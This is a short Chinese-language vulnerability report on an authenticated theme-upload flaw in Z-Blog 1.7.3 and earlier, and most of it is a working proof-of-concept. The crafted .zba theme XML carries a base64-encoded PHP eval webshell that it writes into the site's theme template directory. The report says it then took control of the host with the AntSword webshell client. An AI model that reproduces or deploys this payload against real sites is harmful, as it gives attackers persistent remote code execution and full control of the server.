Vulnerability File: zba主题文件

Z-Blog后台文件上传漏洞，影响版本1.7.3及以下 系统对主题文件代码没有做审查，导致将恶意代码写入主题文件后，被系统生成为文件。黑客可以利用这个漏洞，将恶意代码生成至网站目录，而后通过工具完全控制其主机。

状态：严重

**登陆管理后台后，通过上传精心构造的zba主题文件**，成功将木马存放至\zb_users\theme\shell\template\目录下，使用中国蚁剑连接成功

poc

```xml
<?xml version="1.0" encoding="utf-8"?><app version="php" type="theme"><id>aymFreeFive</id><name>shell</name><url>https://xxx.xxx</url><note>shell</note><description>shell</description><path>settings/main.php</path><include>include.php</include><level>1</level><author><name>shell</name><email>iyuanma@qq.com</email><url>https://xxx.xxx/</url></author><source><name>shell</name><email>xxx@qq.com</email><url>https://xxx.xxx</url></source><adapted>1</adapted><version>1</version><pubdate>2024-12-05</pubdate><modified>2024-12-05</modified><price>0</price><phpver>5.5</phpver><advanced><dependency></dependency><rewritefunctions></rewritefunctions><existsfunctions></existsfunctions>
<conflict></conflict></advanced><sidebars><sidebar1></sidebar1><sidebar2></sidebar2><sidebar3></sidebar3><sidebar4></sidebar4><sidebar5></sidebar5><sidebar6></sidebar6><sidebar7></sidebar7><sidebar8></sidebar8><sidebar9></sidebar9></sidebars>
<folder><path>shell/scripts/</path></folder>
<folder><path>shell/settings/</path></folder>
<folder><path>shell/style/images/</path></folder>
<folder><path>shell/style/</path></folder>
<folder><path>shell/template/</path></folder>
<file><path>shell/template/shelll.php</path><stream>PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pID8+</stream></file>
<verify>aHR0cDovL2xvY2FsaG9zdC9ia2IvCkM6L3hhbXBwL2h0ZG9jcy9ia2Iv</verify></app>
```

